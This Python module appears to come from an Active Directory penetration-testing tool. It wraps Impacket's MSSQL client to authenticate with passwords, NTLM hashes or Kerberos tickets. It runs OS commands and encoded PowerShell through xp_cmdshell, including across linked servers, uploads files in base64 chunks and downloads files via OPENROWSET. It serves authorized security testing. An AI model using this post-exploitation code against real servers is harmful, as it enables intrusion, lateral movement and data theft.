"""Native MSSQL execution backend powered by Impacket.

This module provides a small, typed wrapper around Impacket's TDS client so
ADscan can keep using NetExec for discovery/control-plane while handling
complex post-exploitation operations through a stable Python API.
"""

from __future__ import annotations

import base64
import contextlib
import hashlib
import os
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable

from adscan_internal import print_info_debug
from adscan_internal.command_runner import (
    build_execution_output_preview,
    build_text_preview,
    summarize_execution_result,
)
from adscan_internal.integrations.mssql.helpers import is_hash_authentication
from adscan_internal.rich_output import mark_sensitive

_EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"


@dataclass(frozen=True, slots=True)
class NativeMSSQLQueryResult:
    """Structured result returned by one native MSSQL query."""

    success: bool
    query: str
    rows: list[dict[str, Any]]
    stdout: str = ""
    stderr: str = ""
    error_message: str | None = None
    method: str | None = None


ClientFactory = Callable[[str, int, str], Any]


class ImpacketMSSQLBackend:
    """Execute MSSQL queries and OS commands through Impacket's TDS client."""

    def __init__(
        self,
        *,
        host: str,
        port: int = 1433,
        database: str = "master",
        client_factory: ClientFactory | None = None,
    ) -> None:
        self.host = str(host)
        self.port = int(port)
        self.database = str(database)
        self._client_factory = client_factory or self._default_client_factory

    @staticmethod
    def _default_client_factory(host: str, port: int, remote_name: str) -> Any:
        """Build the default Impacket MSSQL client."""
        from impacket import tds

        return tds.MSSQL(host, port=port, remoteName=remote_name)

    def execute_query(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        query: str,
        linked_server: str | None = None,
        timeout: int = 120,
    ) -> NativeMSSQLQueryResult:
        """Execute one T-SQL query and return structured output."""
        final_query = self._wrap_linked_query(query, linked_server)
        client = self._client_factory(self.host, self.port, self.host)
        self._set_socket_timeout(client, timeout)
        started_at = time.perf_counter()
        try:
            if not self._authenticate(
                client,
                domain=domain,
                username=username,
                secret=secret,
            ):
                return NativeMSSQLQueryResult(
                    success=False,
                    query=final_query,
                    rows=[],
                    stderr="Native MSSQL login failed.",
                    error_message="Native MSSQL login failed.",
                )

            rows = list(client.sql_query(final_query) or [])
            stderr, _infos = self._collect_reply_messages(client)
            stdout = self._rows_to_text(rows)
            success = not bool(stderr.strip())
            query_result = NativeMSSQLQueryResult(
                success=success,
                query=final_query,
                rows=rows,
                stdout=stdout,
                stderr=stderr,
                error_message=stderr or None,
            )
            self._log_query_debug(
                query=final_query,
                result=query_result,
                username=username,
                linked_server=linked_server,
                duration_seconds=time.perf_counter() - started_at,
            )
            return query_result
        except Exception as exc:  # noqa: BLE001
            query_result = NativeMSSQLQueryResult(
                success=False,
                query=final_query,
                rows=[],
                stderr=str(exc),
                error_message=str(exc),
            )
            self._log_query_debug(
                query=final_query,
                result=query_result,
                username=username,
                linked_server=linked_server,
                duration_seconds=time.perf_counter() - started_at,
            )
            return query_result
        finally:
            with contextlib.suppress(Exception):
                client.disconnect()

    def execute_xp_cmdshell(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        command: str,
        linked_server: str | None = None,
        timeout: int = 300,
    ) -> NativeMSSQLQueryResult:
        """Execute one operating-system command via ``xp_cmdshell``."""
        escaped_command = self._escape_tsql_literal(command)
        wrapped_linked_server: str | None = linked_server
        if linked_server:
            escaped_linked_server = str(linked_server).replace("]", "]]")
            query = f"EXEC ('xp_cmdshell ''{escaped_command}''') AT [{escaped_linked_server}]"
            wrapped_linked_server = None
        else:
            query = f"EXEC master..xp_cmdshell '{escaped_command}'"
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=query,
            linked_server=wrapped_linked_server,
            timeout=timeout,
        )
        return NativeMSSQLQueryResult(
            success=result.success,
            query=result.query,
            rows=result.rows,
            stdout=result.stdout,
            stderr=result.stderr,
            error_message=result.error_message,
            method="linked_xp_cmdshell_native" if linked_server else "xp_cmdshell_native",
        )

    def execute_powershell(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        encoded_command: str,
        linked_server: str | None = None,
        timeout: int = 300,
    ) -> NativeMSSQLQueryResult:
        """Execute one encoded PowerShell payload through ``xp_cmdshell``."""
        command = f"powershell.exe -EncodedCommand {encoded_command}"
        return self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=command,
            linked_server=linked_server,
            timeout=timeout,
        )

    def upload_file(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        local_path: str,
        remote_path: str,
        linked_server: str | None = None,
        timeout: int = 300,
        chunk_size: int = 1024,
    ) -> NativeMSSQLQueryResult:
        """Upload one file via ``xp_cmdshell`` + base64 chunks + PowerShell decode."""
        local_file = Path(local_path)
        data = local_file.read_bytes()
        encoded_data = base64.b64encode(data).decode("ascii")
        remote_b64_path = f"{remote_path}.b64"
        queries: list[NativeMSSQLQueryResult] = []
        total_chunks = -(-len(encoded_data) // chunk_size)  # ceil division

        print_info_debug(
            f"[native_backend] upload_file start "
            f"local={mark_sensitive(local_path, 'path')} "
            f"remote={mark_sensitive(remote_path, 'path')} "
            f"linked_server={mark_sensitive(linked_server or 'none', 'hostname')} "
            f"file_bytes={len(data)} b64_chars={len(encoded_data)} "
            f"chunks={total_chunks} chunk_size={chunk_size}"
        )

        # Ensure we do not append to stale data from previous runs.
        delete_command = f'cmd /c del /f /q "{remote_b64_path}" 2>nul'
        queries.append(
            self.execute_xp_cmdshell(
                domain=domain,
                username=username,
                secret=secret,
                command=delete_command,
                linked_server=linked_server,
                timeout=timeout,
            )
        )

        for index in range(0, len(encoded_data), chunk_size):
            chunk = encoded_data[index : index + chunk_size]
            chunk_num = index // chunk_size + 1
            # First chunk uses single '>' (overwrite/create) so that any stale .b64
            # from a previous run that the pre-delete failed to remove is always
            # truncated.  Subsequent chunks append with '>>'.
            redirect = ">" if index == 0 else ">>"
            append_command = f'cmd /c echo {chunk}{redirect}"{remote_b64_path}"'
            chunk_result = self.execute_xp_cmdshell(
                domain=domain,
                username=username,
                secret=secret,
                command=append_command,
                linked_server=linked_server,
                timeout=timeout,
            )
            queries.append(chunk_result)
            if not chunk_result.success:
                print_info_debug(
                    f"[native_backend] upload_file chunk FAILED "
                    f"chunk={chunk_num}/{total_chunks} "
                    f"remote_b64={mark_sensitive(remote_b64_path, 'path')} "
                    f"error={mark_sensitive(chunk_result.error_message or '(none)', 'text')}"
                )
                return self._collapse_results(
                    queries,
                    error_message=f"Failed to upload base64 chunk {chunk_num}/{total_chunks} to {remote_b64_path}.",
                )

        print_info_debug(
            f"[native_backend] upload_file chunks done "
            f"chunks={total_chunks} remote_b64={mark_sensitive(remote_b64_path, 'path')}"
        )

        # Delete any stale target file so that Test-Path verification after decode
        # cannot falsely pass because an old file from a previous run still exists.
        delete_target_command = f'cmd /c del /f /q "{remote_path}" 2>nul'
        queries.append(
            self.execute_xp_cmdshell(
                domain=domain,
                username=username,
                secret=secret,
                command=delete_target_command,
                linked_server=linked_server,
                timeout=timeout,
            )
        )

        decode_command = self._build_ps_decode_command(remote_b64_path, remote_path)
        print_info_debug(
            f"[native_backend] upload_file decode start "
            f"b64={mark_sensitive(remote_b64_path, 'path')} "
            f"target={mark_sensitive(remote_path, 'path')}"
        )
        decode_result = self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=decode_command,
            linked_server=linked_server,
            timeout=timeout,
        )
        queries.append(decode_result)
        _decode_stdout = str(decode_result.stdout or "").strip()
        print_info_debug(
            f"[native_backend] upload_file decode result "
            f"success={decode_result.success} "
            f"stdout={mark_sensitive(_decode_stdout[:300] or '(empty)', 'text')}"
        )

        # Verify the target file was actually written — the PowerShell decode
        # step emits no stdout on success, but if it threw an exception the
        # output contains the error message.  Check with Test-Path so we can
        # surface a clear error instead of silently proceeding with a missing file.
        verify_ps = f"if (Test-Path -LiteralPath '{remote_path}') {{ 'ok' }} else {{ throw 'decoded file not found: {remote_path}' }}"
        verify_encoded = base64.b64encode(verify_ps.encode("utf-16-le")).decode("ascii")
        verify_command = f"powershell.exe -NoP -NonI -EncodedCommand {verify_encoded}"
        verify_result = self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=verify_command,
            linked_server=linked_server,
            timeout=timeout,
        )
        queries.append(verify_result)
        _verify_stdout = str(verify_result.stdout or "").strip()
        _verify_ok = "ok" in _verify_stdout.lower()
        print_info_debug(
            f"[native_backend] upload_file verify result "
            f"ok={_verify_ok} "
            f"stdout={mark_sensitive(_verify_stdout[:300] or '(empty)', 'text')}"
        )
        if not _verify_ok:
            return self._collapse_results(
                queries,
                error_message=(
                    f"PowerShell base64 decode did not produce the target file '{remote_path}'. "
                    + (f"Decode output: {_decode_stdout[:300]}" if _decode_stdout else "No decode output.")
                ),
            )
        cleanup_command = f'cmd /c del /f /q "{remote_b64_path}"'
        cleanup_result = self.execute_xp_cmdshell(
            domain=domain,
            username=username,
            secret=secret,
            command=cleanup_command,
            linked_server=linked_server,
            timeout=timeout,
        )
        queries.append(cleanup_result)
        _cleanup_stdout = str(cleanup_result.stdout or "").strip()
        print_info_debug(
            f"[native_backend] upload_file complete "
            f"remote={mark_sensitive(remote_path, 'path')} "
            f"file_bytes={len(data)} "
            f"b64_cleanup={'ok' if not _cleanup_stdout else mark_sensitive(_cleanup_stdout[:200], 'text')}"
        )
        return self._collapse_results(
            queries,
            success_hint="Native MSSQL upload completed.",
        )

    def download_file(
        self,
        *,
        domain: str,
        username: str,
        secret: str,
        remote_path: str,
        local_path: str,
        linked_server: str | None = None,
        timeout: int = 300,
    ) -> NativeMSSQLQueryResult:
        """Download one file using ``OPENROWSET(BULK ...)`` when available."""
        escaped_remote_path = self._escape_tsql_literal(remote_path)
        query = (
            "SELECT * FROM OPENROWSET(BULK N'"
            f"{escaped_remote_path}"
            "', SINGLE_BLOB) AS FileContent"
        )
        result = self.execute_query(
            domain=domain,
            username=username,
            secret=secret,
            query=query,
            linked_server=linked_server,
            timeout=timeout,
        )
        if not result.success or not result.rows:
            return NativeMSSQLQueryResult(
                success=False,
                query=result.query,
                rows=result.rows,
                stdout=result.stdout,
                stderr=result.stderr,
                error_message=result.error_message or "Native MSSQL download returned no rows.",
                method="openrowset_bulk_native",
            )

        file_bytes = self._extract_bulk_bytes(result.rows[0])
        if file_bytes is None:
            return NativeMSSQLQueryResult(
                success=False,
                query=result.query,
                rows=result.rows,
                stdout=result.stdout,
                stderr=result.stderr,
                error_message="Could not decode MSSQL BULK download payload.",
                method="openrowset_bulk_native",
            )

        destination = Path(local_path)
        destination.parent.mkdir(parents=True, exist_ok=True)
        destination.write_bytes(file_bytes)
        return NativeMSSQLQueryResult(
            success=True,
            query=result.query,
            rows=result.rows,
            stdout=result.stdout,
            stderr=result.stderr,
            method="openrowset_bulk_native",
        )

    @staticmethod
    def _collapse_results(
        results: list[NativeMSSQLQueryResult],
        *,
        success_hint: str | None = None,
        error_message: str | None = None,
    ) -> NativeMSSQLQueryResult:
        """Collapse a sequence of query results into one summary result."""
        combined_stdout = "\n".join(
            entry.stdout.strip() for entry in results if str(entry.stdout or "").strip()
        ).strip()
        combined_stderr = "\n".join(
            entry.stderr.strip() for entry in results if str(entry.stderr or "").strip()
        ).strip()
        success = all(entry.success for entry in results)
        if success and success_hint:
            combined_stdout = (
                f"{combined_stdout}\n{success_hint}".strip() if combined_stdout else success_hint
            )
        return NativeMSSQLQueryResult(
            success=success,
            query=";\n".join(entry.query for entry in results if entry.query),
            rows=[],
            stdout=combined_stdout,
            stderr=combined_stderr,
            error_message=None if success else (error_message or combined_stderr or None),
            method=results[-1].method if results else None,
        )

    def _authenticate(
        self,
        client: Any,
        *,
        domain: str,
        username: str,
        secret: str,
    ) -> bool:
        """Authenticate against MSSQL using password, NTLM hash, or Kerberos cache."""
        if str(secret or "").strip().lower().endswith(".ccache"):
            with self._temporary_kerberos_env(secret):
                return bool(
                    client.kerberosLogin(
                        self.database,
                        username,
                        "",
                        domain,
                        useCache=True,
                    )
                )

        if is_hash_authentication(secret):
            hash_value = f"{_EMPTY_LM_HASH}:{secret}"
            return bool(
                client.login(
                    self.database,
                    username,
                    "",
                    domain,
                    hashes=hash_value,
                    useWindowsAuth=bool(domain),
                )
            )

        return bool(
            client.login(
                self.database,
                username,
                secret,
                domain,
                useWindowsAuth=bool(domain),
            )
        )

    @staticmethod
    def _set_socket_timeout(client: Any, timeout: int) -> None:
        """Apply a best-effort socket timeout to the underlying Impacket client."""
        with contextlib.suppress(Exception):
            client.connect()
        socket_obj = getattr(client, "socket", None)
        with contextlib.suppress(Exception):
            if socket_obj is not None:
                socket_obj.settimeout(timeout)

    @staticmethod
    def _collect_reply_messages(client: Any) -> tuple[str, list[str]]:
        """Collect reply messages without printing them to the user."""
        errors: list[str] = []
        infos: list[str] = []
        with contextlib.suppress(Exception):
            client.printReplies(
                error_logger=lambda message: errors.append(str(message)),
                info_logger=lambda message: infos.append(str(message)),
            )
        return "\n".join(item for item in errors if item).strip(), infos

    @staticmethod
    def _rows_to_text(rows: list[dict[str, Any]]) -> str:
        """Convert MSSQL result rows to a readable stdout representation."""
        lines: list[str] = []
        for row in rows:
            if not isinstance(row, dict):
                text = str(row).strip()
                if text:
                    lines.append(text)
                continue
            if "output" in row:
                text = ImpacketMSSQLBackend._decode_value(row.get("output")).strip()
                if text:
                    lines.append(text)
                continue
            values = [
                ImpacketMSSQLBackend._decode_value(value).strip()
                for value in row.values()
                if value is not None
            ]
            joined = " ".join(item for item in values if item).strip()
            if joined:
                lines.append(joined)
        return "\n".join(lines).strip()

    @staticmethod
    def _build_ps_decode_command(b64_path: str, target_path: str) -> str:
        """Build a ``powershell.exe -EncodedCommand`` that decodes a base64 file.

        Replaces ``certutil -decode`` which fails silently on some systems when
        the encoded data contains CRLF line endings produced by ``cmd /c echo``.
        The PowerShell approach strips all non-base64 characters before decoding,
        making it immune to trailing CRLF, spaces, or other echo artefacts.

        Uses ``-EncodedCommand`` (UTF-16-LE base64) so no quoting or SQL-escaping
        issues arise regardless of path characters.
        """
        # PS uses single-quoted strings so backslashes are literal.
        ps_script = (
            f"$r=(Get-Content '{b64_path}' -Encoding ASCII)-join'';"
            f"$r=$r.Trim()-replace'[^A-Za-z0-9+/=]','';"
            f"[IO.File]::WriteAllBytes('{target_path}',[Convert]::FromBase64String($r))"
        )
        encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode("ascii")
        return f"powershell.exe -NoP -NonI -EncodedCommand {encoded}"

    def _log_query_debug(
        self,
        *,
        query: str,
        result: NativeMSSQLQueryResult,
        username: str,
        linked_server: str | None,
        duration_seconds: float,
    ) -> None:
        """Emit one debug summary for a native MSSQL operation."""
        try:
            query_preview = build_text_preview(query, head=20, tail=20)
            print_info_debug(
                "[mssql_native] Query:\n"
                + mark_sensitive(query_preview or query, "text"),
                panel=True,
            )
            synthetic_result = subprocess.CompletedProcess(
                args="[mssql_native]",
                returncode=0 if result.success else 1,
                stdout=result.stdout or "",
                stderr=result.stderr or "",
            )
            setattr(synthetic_result, "_adscan_elapsed_seconds", duration_seconds)
            exit_code, stdout_count, stderr_count, duration_text = (
                summarize_execution_result(synthetic_result)
            )
            query_hash = hashlib.sha1((query or "").encode("utf-8")).hexdigest()[:12]
            query_lines = len([line for line in (query or "").splitlines() if line.strip()])
            print_info_debug(
                "[mssql_native] Result: "
                f"host={mark_sensitive(self.host, 'hostname')}, "
                f"user={mark_sensitive(username, 'user')}, "
                f"linked_server={mark_sensitive(linked_server, 'hostname') if linked_server else 'none'}, "
                f"query_sha1={query_hash}, "
                f"query_lines={query_lines}, "
                f"exit_code={exit_code}, "
                f"stdout_lines={stdout_count}, "
                f"stderr_lines={stderr_count}, "
                f"success={result.success}, "
                f"duration={duration_text}"
            )
            preview_text = build_execution_output_preview(
                synthetic_result,
                stdout_head=12,
                stdout_tail=12,
                stderr_head=12,
                stderr_tail=12,
            )
            if preview_text:
                print_info_debug(
                    "[mssql_native] Output preview:\n"
                    + mark_sensitive(preview_text, "text"),
                    panel=True,
                )
        except Exception:
            return

    @staticmethod
    def _decode_value(value: Any) -> str:
        """Decode one MSSQL cell value into text."""
        if value is None:
            return ""
        if isinstance(value, bytes):
            for encoding in ("utf-8", "utf-16le", "latin-1"):
                with contextlib.suppress(Exception):
                    return value.decode(encoding)
            return value.hex()
        return str(value)

    @staticmethod
    def _extract_bulk_bytes(row: dict[str, Any]) -> bytes | None:
        """Decode the payload returned by ``OPENROWSET(BULK ...)``."""
        if not isinstance(row, dict) or not row:
            return None
        value = next(iter(row.values()))
        if isinstance(value, (bytes, bytearray)):
            with contextlib.suppress(ValueError):
                return bytes.fromhex(bytes(value).decode("ascii"))
            return bytes(value)
        if isinstance(value, str):
            with contextlib.suppress(ValueError):
                return bytes.fromhex(value)
            with contextlib.suppress(Exception):
                return base64.b64decode(value, validate=True)
        return None

    @staticmethod
    def _wrap_linked_query(query: str, linked_server: str | None) -> str:
        """Wrap one query for execution against a linked SQL server."""
        if not linked_server:
            return query
        escaped_query = query.replace("'", "''")
        escaped_linked_server = str(linked_server).replace("]", "]]")
        return f"EXEC ('{escaped_query}') AT [{escaped_linked_server}]"

    @staticmethod
    def _escape_tsql_literal(value: str) -> str:
        """Escape one value for safe inclusion inside a T-SQL string literal."""
        return str(value or "").replace("'", "''")

    @staticmethod
    @contextlib.contextmanager
    def _temporary_kerberos_env(ticket_path: str):
        """Temporarily point ``KRB5CCNAME`` at one ccache file."""
        previous = os.environ.get("KRB5CCNAME")
        os.environ["KRB5CCNAME"] = str(ticket_path)
        try:
            yield
        finally:
            if previous is None:
                os.environ.pop("KRB5CCNAME", None)
            else:
                os.environ["KRB5CCNAME"] = previous


__all__ = [
    "ImpacketMSSQLBackend",
    "NativeMSSQLQueryResult",
]
